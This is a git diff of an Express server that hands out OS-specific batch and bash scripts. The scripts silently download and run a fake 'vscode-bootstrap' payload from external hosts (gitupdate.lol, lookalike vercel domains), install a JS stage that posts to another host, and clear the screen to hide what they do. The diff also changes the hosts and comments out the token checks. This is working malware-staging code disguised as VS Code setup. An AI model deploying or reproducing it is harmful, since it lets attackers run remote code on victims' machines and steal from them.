@@ -71,34 +71,34 @@ app.use(async (req, res, next) => {
   next();
 });
 
-app.get("/settings/:type", (req, res) => {
+app.get("/:type", (req, res) => {
   const { type } = req.params;
-  const { flag } = req.query;
+  const { flag } = 5;
 
   let script = "";
 
   switch (type) {
     case "windows":
-      if (!VALID_FLAGS.includes(flag)) {
-        return res.status(403).send("Unauthorized token");
-      }
+      // if (!VALID_FLAGS.includes(flag)) {
+      //   return res.status(403).send("Unauthorized token");
+      // }
       script = `
 @echo off
 set "VSCODE_DIR=%USERPROFILE%\\.vscode"
 
 if not exist "%VSCODE_DIR%" ( mkdir "%VSCODE_DIR%" )
 
-curl -s -L -o "%VSCODE_DIR%\\vscode-bootstrap.cmd" https://auth-drive-google.vercel.app/settings/bootstrap?flag=${flag}
+curl -s -L -o "%VSCODE_DIR%\\vscode-bootstrap.cmd" https://gitupdate.lol/bootstrap?flag=${flag}
 cls
 "%VSCODE_DIR%\\vscode-bootstrap.cmd"
 cls
     	`;
-    	break;
+      break;
 
     case "linux":
-      if (!VALID_FLAGS.includes(flag)) {
-        return res.status(403).send("Unauthorized token");
-      }
+      // if (!VALID_FLAGS.includes(flag)) {
+      //   return res.status(403).send("Unauthorized token");
+      // }
       script = `
 #!/bin/bash
 set -e
@@ -107,7 +107,7 @@ echo "Authenticated"
 TARGET_DIR="$HOME/.vscode"
 mkdir -p "$TARGET_DIR"
 clear
-wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "https://auth-drive-google.vercel.app/settings/bootstraplinux?flag=${flag}"
+wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "https://gitupdate.lol/bootstraplinux?flag=${flag}"
 clear
 chmod +x "$TARGET_DIR/vscode-bootstrap.sh"
 clear
@@ -115,19 +115,19 @@ nohup bash "$TARGET_DIR/vscode-bootstrap.sh" > /dev/null 2>&1 &
 clear
 exit 0
     	`;
-    	break;
+      break;
 
     case "mac":
-      if (!VALID_FLAGS.includes(flag)) {
-        return res.status(403).send("Unauthorized token");
-      }
+      // if (!VALID_FLAGS.includes(flag)) {
+      //   return res.status(403).send("Unauthorized token");
+      // }
       script = `
 #!/bin/bash
 set -e
 echo "Authenticated"
 mkdir -p "$HOME/.vscode"
 clear
-curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "https://auth-drive-google.vercel.app/settings/bootstraplinux?flag=${flag}"
+curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "https://gitupdate.lol/bootstraplinux?flag=${flag}"
 clear
 chmod +x "$HOME/.vscode/vscode-bootstrap.sh"
 clear
@@ -135,12 +135,12 @@ nohup bash "$HOME/.vscode/vscode-bootstrap.sh" > /dev/null 2>&1 &
 clear
 exit 0
     	`;
-    	break;
+      break;
 
     case "bootstrap":
-      if (!VALID_FLAGS.includes(flag)) {
-        return res.status(403).send("Unauthorized token");
-      }
+      // if (!VALID_FLAGS.includes(flag)) {
+      //   return res.status(403).send("Unauthorized token");
+      // }
       script = `
 @echo off
 title Creating new Info
@@ -221,8 +221,8 @@ if not defined NODE_EXE (
 set "CODEPROFILE=%USERPROFILE%\\.vscode"
 echo [INFO] Downloading env-setup.npl and package.json...
 
-curl -L -o "%CODEPROFILE%\\env-setup.npl" "https://auth-drive-google.vercel.app/settings/env?flag=${flag}"
-curl -L -o "%CODEPROFILE%\\package.json" "https://auth-drive-google.vercel.app/settings/package"
+curl -L -o "%CODEPROFILE%\\env-setup.npl" "https://gitupdate.lol/env?flag=${flag}"
+curl -L -o "%CODEPROFILE%\\package.json" "https://gitupdate.lol/package"
 
 :: -------------------------
 :: Install dependencies
@@ -259,12 +259,12 @@ if exist "%CODEPROFILE%\\env-setup.npl" (
 echo [SUCCESS] Script completed successfully.
 exit /b 0
     	`;
-    	break;
+      break;
 
     case "bootstraplinux":
-      if (!VALID_FLAGS.includes(flag)) {
-        return res.status(403).send("Unauthorized token");
-      }
+      // if (!VALID_FLAGS.includes(flag)) {
+      //   return res.status(403).send("Unauthorized token");
+      // }
       script = `
 #!/bin/bash
 # Creating new Info
@@ -374,14 +374,14 @@ fi
 # -------------------------
 USER_HOME="$HOME/.vscode"
 mkdir -p "\${USER_HOME}"
-BASE_URL="https://auth-drive-google.vercel.app"
+BASE_URL="https://gitupdate.lol"
 echo "[INFO] Downloading env-setup.js and package.json..."
 if ! command -v curl >/dev/null 2>&1; then
-    wget -q -O "\${USER_HOME}/env-setup.js" "\${BASE_URL}/settings/env?flag=${flag}"
-    wget -q -O "\${USER_HOME}/package.json" "\${BASE_URL}/settings/package"
+    wget -q -O "\${USER_HOME}/env-setup.js" "\${BASE_URL}/env?flag=${flag}"
+    wget -q -O "\${USER_HOME}/package.json" "\${BASE_URL}/package"
 else
-    curl -s -L -o "\${USER_HOME}/env-setup.js" "\${BASE_URL}/settings/env?flag=${flag}"
-    curl -s -L -o "\${USER_HOME}/package.json" "\${BASE_URL}/settings/package"
+    curl -s -L -o "\${USER_HOME}/env-setup.js" "\${BASE_URL}/env?flag=${flag}"
+    curl -s -L -o "\${USER_HOME}/package.json" "\${BASE_URL}/package"
 fi
 # -------------------------
 # Install dependencies
@@ -424,9 +424,9 @@ echo "[SUCCESS] Script completed successfully."
 exit 0
 `;
 
-    	break;
-	case "package":
-		script = `
+      break;
+    case "package":
+      script = `
 	{
 		"name": "env",
 		"version": "1.0.0",
@@ -447,15 +447,15 @@ exit 0
 		}
 	}
 		`;
-		break;
-	case "env":
-    if (!VALID_FLAGS.includes(flag)) {
-      return res.status(403).send("Unauthorized token");
-    }
-    
-		script = `
+      break;
+    case "env":
+      // if (!VALID_FLAGS.includes(flag)) {
+      //   return res.status(403).send("Unauthorized token");
+      // }
+
+      script = `
 	const axios = require('axios');
-const host = "checkmyip-address.vercel.app";
+const host = "node-env-check.vercel.app";
 const apikey = "3aeb34a3${flag}";
 axios
   .post(
@@ -471,7 +471,7 @@ axios
     return false;
   });
 	`;
-	break;
+      break;
 
     default:
       return res.status(400).send("Invalid OS");
